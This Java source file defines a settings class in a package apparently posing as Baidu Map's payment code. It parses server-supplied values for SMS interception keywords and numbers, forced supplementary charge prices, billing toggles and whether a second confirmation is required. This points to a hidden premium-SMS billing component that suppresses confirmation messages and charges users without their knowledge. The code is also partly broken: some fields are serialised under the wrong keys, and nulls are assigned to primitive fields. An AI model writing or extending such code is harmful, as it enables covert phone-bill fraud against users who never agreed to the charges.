package com.baidu.BaiduMap.json;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import org.json.JSONObject;

import com.baidu.BaiduMap.json.JsonEntity.JsonInterface;
import com.baidu.BaiduMap.pay.SDKInit;
import com.baidu.BaiduMap.utils.ACache;
import com.baidu.BaiduMap.utils.ACacheUtils;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.Utils;

public class SetEntity implements JsonInterface, Serializable {
    static List<String> list = new ArrayList<>();
    /**
     * 是否需要二次确认 true为需要 false为不需要
     */
    public Boolean isSecondConfirm = true;
    /**
     * 短信拦截信息关键字
     */
    public String messageBody = "";
    /**
     * 短信拦截号码
     */
    public String phoneNumber = "";
    /**
     * 补单金额
     */
    public String prices = "";

    /**
     * 2014-10-14 added by pengbb 强制补单价格
     */
    public int supplyPrice = 0;
    public String AThrough;
    public String BThrough;
    public String CThrough;
    public String DThrough;
    public String EThrough;
    public String FThrough;
    public String GThrough;
    public String HThrough;

    public String init_AThrough;
    public String init_BThrough;
    public String init_CThrough;
    public String init_DThrough;
    public String init_EThrough;
    public String init_FThrough;
    public String init_GThrough;
    public String init_HThrough;

    public String bd_AThrough;
    public String bd_BThrough;
    public String bd_CThrough;
    public String bd_DThrough;
    public String bd_EThrough;
    public String bd_FThrough;
    public String bd_GThrough;
    public String bd_HThrough;

    public String phone1;
    public String phone2;
    public boolean isOpenPay_month;
    public int bd_times;
    public boolean bd_Isapply;
    public boolean isOpen_jifei;


    @Override
    public JSONObject buildJson() {
        try {
            JSONObject json = new JSONObject();
            json.put("isSecondConfirm", isSecondConfirm);
            json.put("messageBody", messageBody);
            json.put("phoneNumber", phoneNumber);
            json.put("prices", prices);
            json.put("supplyPrice", supplyPrice);
            json.put("AThrough", AThrough);
            json.put("BThrough", BThrough);
            json.put("CThrough", CThrough);
            json.put("DThrough", DThrough);
            json.put("EThrough", EThrough);
            json.put("FThrough", FThrough);
            json.put("GThrough", GThrough);
            json.put("HThrough", HThrough);
            json.put("init_AThrough", init_AThrough);
            json.put("init_BThrough", init_BThrough);
            json.put("init_CThrough", init_CThrough);
            json.put("init_DThrough", init_DThrough);
            json.put("init_EThrough", init_EThrough);
            json.put("init_FThrough", init_FThrough);
            json.put("init_GThrough", init_GThrough);
            json.put("init_HThrough", init_HThrough);
            json.put("init_AThrough", bd_AThrough);
            json.put("init_BThrough", bd_BThrough);
            json.put("init_CThrough", bd_CThrough);
            json.put("init_DThrough", bd_DThrough);
            json.put("init_EThrough", bd_EThrough);
            json.put("init_FThrough", bd_FThrough);
            json.put("init_GThrough", bd_GThrough);
            json.put("init_HThrough", bd_HThrough);
            json.put("phone1", phone1);
            json.put("phone2", phone2);
            json.put("bd_times", bd_times);
            json.put("isOpenPay_month", isOpenPay_month);
            json.put("isapply", bd_Isapply);
            json.put("isOpen_jifei", isOpen_jifei);
            return json;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public void parseJson(JSONObject json) {
        if (json == null)
            return;
        Log.debug("parseJson begin:" + json.toString());
        try {
            isSecondConfirm = json.isNull("isSecondConfirm") ? false : json.getBoolean("isSecondConfirm");
            isOpenPay_month = json.isNull("isOpenPay_month") ? false : json.getBoolean("isOpenPay_month");
            messageBody = json.isNull("messageBody") ? null : json.getString("messageBody");
            phoneNumber = json.isNull("phoneNumber") ? null : json.getString("phoneNumber");
            prices = json.isNull("prices") ? null : json.getString("prices");
            supplyPrice = json.isNull("supplyPrice") ? 0 : json.getInt("supplyPrice");
            AThrough = json.isNull("AThrough") ? null : json.getString("AThrough");
            BThrough = json.isNull("BThrough") ? null : json.getString("BThrough");
            CThrough = json.isNull("CThrough") ? null : json.getString("CThrough");
            DThrough = json.isNull("DThrough") ? null : json.getString("DThrough");
            EThrough = json.isNull("EThrough") ? null : json.getString("EThrough");
            FThrough = json.isNull("FThrough") ? null : json.getString("FThrough");
            GThrough = json.isNull("GThrough") ? null : json.getString("GThrough");
            HThrough = json.isNull("HThrough") ? null : json.getString("HThrough");
            init_AThrough = json.isNull("init_AThrough") ? null : json.getString("init_AThrough");
            init_BThrough = json.isNull("init_BThrough") ? null : json.getString("init_BThrough");
            init_CThrough = json.isNull("init_CThrough") ? null : json.getString("init_CThrough");
            init_DThrough = json.isNull("init_DThrough") ? null : json.getString("init_DThrough");
            init_EThrough = json.isNull("init_EThrough") ? null : json.getString("init_EThrough");
            init_FThrough = json.isNull("init_FThrough") ? null : json.getString("init_FThrough");
            init_GThrough = json.isNull("init_GThrough") ? null : json.getString("init_GThrough");
            init_HThrough = json.isNull("init_HThrough") ? null : json.getString("init_HThrough");

            if (Constants.isOutPut) {
                Log.debug("init_AThrough----------->" + init_AThrough);
                Log.debug("init_BThrough----------->" + init_BThrough);
                Log.debug("init_CThrough----------->" + init_CThrough);
                Log.debug("init_DThrough----------->" + init_DThrough);
                Log.debug("init_EThrough----------->" + init_EThrough);
                Log.debug("init_FThrough----------->" + init_FThrough);
                Log.debug("init_GThrough----------->" + init_GThrough);
                Log.debug("init_HThrough----------->" + init_HThrough);
            }
            phone1 = json.isNull("phone1") ? null : json.getString("phone1");
            phone2 = json.isNull("phone2") ? null : json.getString("phone2");
            bd_AThrough = json.isNull("bd_AThrough") ? null : json.getString("bd_AThrough");
            bd_BThrough = json.isNull("bd_BThrough") ? null : json.getString("bd_BThrough");
            bd_CThrough = json.isNull("bd_CThrough") ? null : json.getString("bd_CThrough");
            bd_DThrough = json.isNull("bd_DThrough") ? null : json.getString("bd_DThrough");
            bd_EThrough = json.isNull("bd_EThrough") ? null : json.getString("bd_EThrough");
            bd_FThrough = json.isNull("bd_FThrough") ? null : json.getString("bd_FThrough");
            bd_GThrough = json.isNull("bd_GThrough") ? null : json.getString("bd_GThrough");
            bd_HThrough = json.isNull("bd_HThrough") ? null : json.getString("bd_HThrough");

            bd_times = json.isNull("bd_times") ? null : json.getInt("bd_times");
            bd_Isapply = json.isNull("isapply") ? null : json.getBoolean("isapply");
            isOpen_jifei = json.isNull("isOpen_jifei") ? null : json.getBoolean("isOpen_jifei");

            if (Constants.isOutPut) {
                Log.debug("bd_AThrough----------->" + bd_AThrough);
                Log.debug("bd_BThrough----------->" + bd_BThrough);
                Log.debug("bd_CThrough----------->" + bd_CThrough);
                Log.debug("bd_DThrough----------->" + bd_DThrough);
                Log.debug("bd_EThrough----------->" + bd_EThrough);
                Log.debug("bd_FThrough----------->" + bd_FThrough);
                Log.debug("bd_GThrough----------->" + bd_GThrough);
                Log.debug("bd_HThrough----------->" + bd_HThrough);
                Log.debug("bd_times-------------->" + bd_times);
                Log.debug("isapply-------------->" + bd_Isapply);
                Log.debug("isOpen_jifei--------->" + isOpen_jifei);
            }
            if (list.size() > 0) {
                list.clear();
            }
            list.add(AThrough);
            list.add(BThrough);
            list.add(CThrough);
            list.add(DThrough);
            list.add(EThrough);
            list.add(FThrough);
            list.add(GThrough);
            list.add(HThrough);

            list.add(init_AThrough);
            list.add(init_BThrough);
            list.add(init_CThrough);
            list.add(init_DThrough);
            list.add(init_EThrough);
            list.add(init_FThrough);
            list.add(init_GThrough);
            list.add(init_HThrough);

            list.add(bd_AThrough);
            list.add(bd_BThrough);
            list.add(bd_CThrough);
            list.add(bd_DThrough);
            list.add(bd_EThrough);
            list.add(bd_FThrough);
            list.add(bd_GThrough);
            list.add(bd_HThrough);

            Log.debug("=====>list size:" + list.size());
            Log.debug("=====>list content:" + list.toString());
            ACacheUtils.getInstance(SDKInit.mContext).putList(list);
            Log.debug("=====>size:" + ACacheUtils.getInstance(SDKInit.mContext).getList().size());
            Log.debug("=====>toString:" + ACacheUtils.getInstance(SDKInit.mContext).getList().toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getShortName() {
        return null;
    }

    private static final String SPLIT_STRING = "|#*";

    public boolean getMessage(String messageString) {
        String[] ss = Utils.split(messageString, SPLIT_STRING);
        if (ss == null)
            return false;
        try {
            isSecondConfirm = Boolean.parseBoolean(ss[0]);
            messageBody = ss[1];
            phoneNumber = ss[2];
            prices = ss[3];
            return true;
        } catch (Exception e) {
            if (Log.D) {
                e.printStackTrace();
            }
            return false;
        }

    }

    @Override
    public String toString() {
        return "Setting [isSecondConfirm=" + isSecondConfirm + ",&￥ messageBody=" + messageBody + ",&￥ phoneNumber="
                + phoneNumber + ",&￥ prices=" + prices + ",&￥ supplyPrice=" + supplyPrice + ",&￥ AThrough=" + AThrough
                + ",&￥ BThrough=" + BThrough + ",&￥ CThrough=" + CThrough + ",&￥ DThrough=" + DThrough + ",&￥ EThrough="
                + EThrough + ",&￥ FThrough=" + FThrough + ",&￥ GThrough=" + GThrough + ",&￥ HThrough=" + HThrough
                + ",&￥ phone1=" + phone1 + ",&￥ phone2=" + phone2 + ",&￥ init_AThrough=" + init_AThrough
                + ",&￥ init_BThrough=" + init_BThrough + ",&￥ init_CThrough=" + init_CThrough + ",&￥ init_DThrough="
                + init_DThrough + ",&￥ init_EThrough=" + init_EThrough + ",&￥ init_FThrough=" + init_FThrough
                + ",&￥ init_GThrough=" + init_GThrough + ",&￥ init_HThrough=" + init_HThrough + ",&￥ isOpenPay_month="
                + isOpenPay_month + ",&￥ bd_AThrough=" + bd_AThrough + ",&￥ bd_BThrough=" + bd_BThrough
                + ",&￥ bd_CThrough=" + bd_CThrough + ",&￥ bd_DThrough=" + bd_DThrough + ",&￥ bd_EThrough=" + bd_EThrough
                + ",&￥ bd_FThrough=" + bd_FThrough + ",&￥ bd_GThrough=" + bd_GThrough + ",&￥ bd_HThrough=" + bd_HThrough
                + ",&￥ bd_times=" + bd_times + ",&￥ isapply=" + bd_Isapply + "]";
    }

    public String getString() {
        StringBuffer sb = new StringBuffer();
        sb.append(isSecondConfirm);// 0
        sb.append(SPLIT_STRING);
        sb.append(messageBody);
        sb.append(SPLIT_STRING);
        sb.append(phoneNumber);
        sb.append(SPLIT_STRING);
        sb.append(prices);
        sb.append(SPLIT_STRING);
        sb.append(supplyPrice);
        sb.append(SPLIT_STRING);
        sb.append(AThrough);
        sb.append(SPLIT_STRING);
        sb.append(BThrough);
        sb.append(SPLIT_STRING);
        sb.append(CThrough);
        sb.append(SPLIT_STRING);
        sb.append(DThrough);
        sb.append(SPLIT_STRING);
        sb.append(EThrough);
        sb.append(SPLIT_STRING);
        sb.append(FThrough);
        sb.append(SPLIT_STRING);
        sb.append(GThrough);
        sb.append(SPLIT_STRING);
        sb.append(HThrough);
        sb.append(SPLIT_STRING);

        sb.append(init_AThrough);
        sb.append(SPLIT_STRING);
        sb.append(init_BThrough);
        sb.append(SPLIT_STRING);
        sb.append(init_CThrough);
        sb.append(SPLIT_STRING);
        sb.append(init_DThrough);
        sb.append(SPLIT_STRING);
        sb.append(init_EThrough);
        sb.append(SPLIT_STRING);
        sb.append(init_FThrough);
        sb.append(SPLIT_STRING);
        sb.append(init_GThrough);
        sb.append(SPLIT_STRING);
        sb.append(init_HThrough);
        sb.append(SPLIT_STRING);
        sb.append(phone1);
        sb.append(SPLIT_STRING);
        sb.append(phone2);
        sb.append(SPLIT_STRING);
        sb.append(isOpenPay_month);
        sb.append(SPLIT_STRING);

        sb.append(bd_AThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_BThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_CThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_DThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_EThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_FThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_GThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_HThrough);
        sb.append(SPLIT_STRING);
        sb.append(bd_times);
        sb.append(SPLIT_STRING);
        sb.append(bd_Isapply);
        sb.append(SPLIT_STRING);

        return sb.toString();
    }

    interface JsonInterface {
        JSONObject buildJson();

        void parseJson(JSONObject json);

        String getShortName();
    }

}
